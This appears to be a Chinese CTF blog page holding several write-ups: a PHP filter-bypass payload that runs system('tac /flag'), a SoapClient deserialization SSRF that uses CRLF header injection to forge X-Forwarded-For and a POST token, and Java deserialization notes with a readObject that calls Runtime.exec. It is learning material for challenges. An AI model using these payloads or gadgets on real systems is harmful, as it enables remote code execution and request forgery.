<p>[被过滤了 可以用{代替 就不用构造了 同样$没过滤 直接用就行</p>
<p>base_convert(37907361743,10,36)(dechex(1598506324))<img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029211738989-1700015833096-29.png" alt="image-20231029211738989"></p>
<p>下面想办法传入$_GET(1)</p>
<p>?c&#x3D;$kkk&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$kkk){1}</p>
<p>思路是先传入一个变量kkk，再用$$kkk等价于与$_GET </p>
<p> 这里发现之前不是什么字母都能用的，把kkk换成白名单了随便一个</p>
<p>c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}</p>
<p>先试试phpinfo()</p>
<p>这里利用变量执行函数，利用了php7的特性</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">($a)($b)   //这里a是一个字符串，内容是一个函数名//b也是字符串，内容是参数$a=&#x27;print_r&#x27;$b=&#x27;test&#x27;//对于无参数函数</span><br><span class="line">$a=&#x27;phpinfo&#x27;$a()</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//无法输出</span><br><span class="line">&lt;?php</span><br><span class="line">  $a=&#x27;phpinfo()&#x27;;</span><br><span class="line">  ($a)</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//正常输出</span><br><span class="line">&lt;?php</span><br><span class="line">  $a=&#x27;phpinfo&#x27;;</span><br><span class="line">  ($a)()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>所以我们为了后面能执行，要传入两个变量 一个是函数名 一个是参数</p>
<p>?c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2})</p>
<p>测试</p>
<p>最终payload:?c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2})&amp;1&#x3D;system&amp;2&#x3D;tac%20&#x2F;flag</p>
<p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029212838216-1700015833096-31.png" alt="image-20231029212838216"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/24/Web259/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Web259">
          <a href="#Web259" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web259" class="headerlink" title="Web259"></a>Web259</h1>
      <p>先贴一下源码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>flag.php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>题目界面就一个简单的get传参，接收到的值反序列化传到getflag()函数</p>
<p>其他啥也没给，想到就是要用到原生类</p>
<p>后面题目界面给的源码，里面要求ip&#x3D;127.0.0.1，他又开启了xff，想改包发包来着，他又进行了两次pop，还要token的值&#x3D;&#x3D;ctfshow，结合这些，基本上可以确定用SoapClient原生类</p>
<p>这里先介绍一下里面的函数</p>
<blockquote>
<p><strong>explode()</strong> 函数可以把字符串打散为数组。</p>
<p>array_pop()函数：去除数组最后一个元素，返回数组的最后一个值。如果数组是空的，或者非数组，将返回 NULL。</p>
<p> file_put_contents函数：把$flag写入flag.txt</p>
<p>explode()函数：把字符串打散为数组</p>
<p>介绍完函数，分析一下去获取flag的过程。 题目中 array_pop()函数 使用了两次，最后将ip赋给$ip，</p>
<p>这里说一下这个 array_pop()函数两次的过程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1						#返回：空</span><br><span class="line">127.0.0.1,127.0.0.2				#返回：127.0.0.1</span><br><span class="line">127.0.0.1,127.0.0.2,127.0.0.3	#返回：127.0.0.2</span><br></pre></td></tr></table></div></figure>


</blockquote>
<p>这里尝试去伪造 X-Forwarded-For，发现不行，因为使用了Cloudflare，至于如何去判断一个网站是否使用了Cloudflare</p>
<p>至于怎么判断一个网站是否试用了Cloudflare代理</p>
<p>接下来我们看一下SoapClient原生类</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class SoapClient &#123;</span><br><span class="line">    /* Methods */</span><br><span class="line">    public __construct(?string $wsdl, array $options = [])</span><br><span class="line">    public __call(string $name, array $args): mixed</span><br><span class="line">    public __doRequest(</span><br><span class="line">        string $request,</span><br><span class="line">        string $location,</span><br><span class="line">        string $action,</span><br><span class="line">        int $version,</span><br><span class="line">        bool $oneWay = false</span><br><span class="line">    ): ?string</span><br><span class="line">    public __getCookies(): array</span><br><span class="line">    public __getFunctions(): ?array</span><br><span class="line">    public __getLastRequest(): ?string</span><br><span class="line">    public __getLastRequestHeaders(): ?string</span><br><span class="line">    public __getLastResponse(): ?string</span><br><span class="line">    public __getLastResponseHeaders(): ?string</span><br><span class="line">    public __getTypes(): ?array</span><br><span class="line">    public __setCookie(string $name, ?string $value = null): void</span><br><span class="line">    public __setLocation(?string $location = null): ?string</span><br><span class="line">    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool</span><br><span class="line">    public __soapCall(</span><br><span class="line">        string $name,</span><br><span class="line">        array $args,</span><br><span class="line">        ?array $options = null,</span><br><span class="line">        SoapHeader|array|null $inputHeaders = null,</span><br><span class="line">        array &amp;$outputHeaders = null</span><br><span class="line">    ): mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>由于<strong>SoapClient</strong>原生类中包含<code>__call</code>方法，并且我们知道：当调用一个对象中不存在的方法时候，会执行<code>call()</code>魔术方法。</p>
<p>因此在CTF中通常会出现一种<strong>存在调用不存在的方法</strong>、<strong>并且需要我们伪造请求头</strong>的题目</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></div></figure>

<p>看源码可以看到他会对传入的vip进行反序列化，并且调用getflag方法，显然此处没有定义getflag方法，因此考虑到跟call魔术方法有关，原生类soap里有这个函数，加上请求头的要求</p>
<p>我们本地测试一下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9998/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/test&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924123610341.png" alt="image-20230924123610341"></p>
<p>仔细观察后，发现是一个POST请求，并且SOAPAction的值是可控的</p>
<p>但是仅仅依靠这一处，没有办法伪造整一个POST请求，因为Content-Type是xml形式的，并且后面的传输内容也都是xml形式的，一般情况下POST传递参数的格式都是表单形式的（application&#x2F;x-www-form-urlencoded)</p>
<p>因此我们可以想办法伪造User-Agent头：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;qingchuan&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9998/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/test&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924123849790.png" alt="image-20230924123849790"></p>
<p>可以看到我们的USER-AGENT也该进去了，当<strong>User-Agent</strong>成为了我们的可控参数后，<strong>User-Agent</strong>下方的<strong>Content-Type</strong>也同样可以被伪造，利用<code>\r\n</code>换行即可伪造</p>
<p>再次修改后的代码如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua=&quot;qingchuan\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1:9998/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1:9999/test&#x27;,&#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">$client-&gt;getFlag();</span><br></pre></td></tr></table></div></figure>

<p>现在我们已经伪造好了请求包</p>
<p>代码中有几个注意的点</p>
<ul>
<li>因为$ua中用到了<code>\r\n</code>这两个换行符，因此要用双引号包裹<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">crlf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li>HTTP请求头之间的参数用一组<code>\r\n</code>分割即可</li>
<li>HTTP请求头与POSTDATA之间要用两个<code>\r\n</code>分割.</li>
<li>设置<strong>User-Agent</strong>时，应写成<strong>user_agent</strong></li>
</ul>
<p>监听一下在</p>
<p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125424078.png" alt="image-20230924125424078"></p>
<p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125512870.png" alt="image-20230924125512870"></p>
<p>红圈里的是有效请求，</p>
<p>因为我们设置了<strong>Content-Length</strong>的值为<strong>13</strong>，超出13个字符以外的都会被服务器丢弃，所以影响不大。</p>
<p>在本地测试完成了，接下来我们将相关参数修改与题目相对应。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua = &quot;qingchuan\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27; , &#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">print_r(urlencode(serialize($client)));</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A133%3A%22qingchuan%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></div></figure>

<p>传入后访问flag.txt即可</p>
<p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125929067.png" alt="image-20230924125929067"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-15</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Java序列化和反序列化学习">
          <a href="#Java序列化和反序列化学习" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java序列化和反序列化学习" class="headerlink" title="Java序列化和反序列化学习"></a>Java序列化和反序列化学习</h1>
      <p>写在前面：谨记java反序列化学习，或许是简单的的吧</p>
<p>##前置知识：</p>
<p>user类和**<code>Serialize_test_1 </code>**的关系</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">		<span class="comment">//定义类的私有属性name</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="comment">//定义setName方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        	<span class="comment">//当前类User的name等于setName传递进来的name</span></span><br><span class="line">        	<span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义getName方法，返回name值</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        	<span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize_test_1</span> &#123;</span><br><span class="line">	<span class="comment">//序列化，返回值为字节类型，输入值为对象Object</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">//创建字节数组输出流实例 btout,将所有发送到输出流的数据保存在该字节数组缓冲区中, 个人理解就是读数据并放入缓存区，读的数据以字节类型的数组保存在缓冲区</span></span><br><span class="line">		<span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">		<span class="comment">//创建objOut 对象输出流实例,也是类似以上的读数据，不过操作的是对象流，不是字节流，序列化对项的类，使其变得可以传输，操作</span></span><br><span class="line">		<span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">		<span class="comment">//调用对象输出为流的对象方法</span></span><br><span class="line">		objOut.writeObject(obj);</span><br><span class="line">		<span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//反序列化,返回值类型为对象类型，输入为字节类型</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">		<span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">		<span class="keyword">return</span> objIn.readObject();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">//实例化对象user，并设置其私有变量name值为posty</span></span><br><span class="line">		<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">		user.setName(<span class="string">&quot;posty&quot;</span>);</span><br><span class="line">		<span class="comment">//序列化对象</span></span><br><span class="line">		<span class="type">byte</span>[] serializeData = serialize(user);</span><br><span class="line">		<span class="comment">//文件流，创建文件user.bin并写序列化后的数据</span></span><br><span class="line">		<span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.bin&quot;</span>);</span><br><span class="line">		fout.write(serializeData);</span><br><span class="line">		fout.close();</span><br><span class="line">		<span class="comment">// (User)表示把反序列化后的对象转为User对象，并赋值给已经声明为User类的变量user2</span></span><br><span class="line">		<span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) unserialize(serializeData);</span><br><span class="line">		<span class="comment">//调用User的getName方法</span></span><br><span class="line">		System.out.print(user2.getName());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>####Java 方法重写</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> qingchuan.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="comment">//原测试为public不成功, 改为private</span></span><br><span class="line">    <span class="comment">//重写readObject()反序列化方法</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="comment">//默认反序列化，反序列化非静态非瞬态字段</span></span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        <span class="comment">//调用exec方法执行命令cmd</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> qingchuan.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj )<span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//序列化，返回值为字节类型，输入值为对象Object</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建objout 对象输出流实例，也是类似以上的读数据，不过操作的是对象流，不是字节流，协力恶化对象的类，使其编的可以传输，操作</span></span><br><span class="line">        objOut.writeObject(obj);<span class="comment">//调用输出对象为流的对象方法</span></span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;<span class="comment">//反序列化，返回值类型为对象类型，输入为字节类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialize)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//恶意cmd测试</span></span><br><span class="line">        <span class="type">evil</span> <span class="variable">evil</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">evil</span>();</span><br><span class="line">        evil.cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="comment">//序列化对象evil并传递蚕食出门的=“calc。exe”；</span></span><br><span class="line">        <span class="type">byte</span>[] serializeData=serialize(evil);</span><br><span class="line">        <span class="comment">//通过自定义的readObject反序列化</span></span><br><span class="line">        <span class="comment">//传递参数cmd,执行了恶意的redaObject（）方法</span></span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">        System.out.println(evil.cmd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
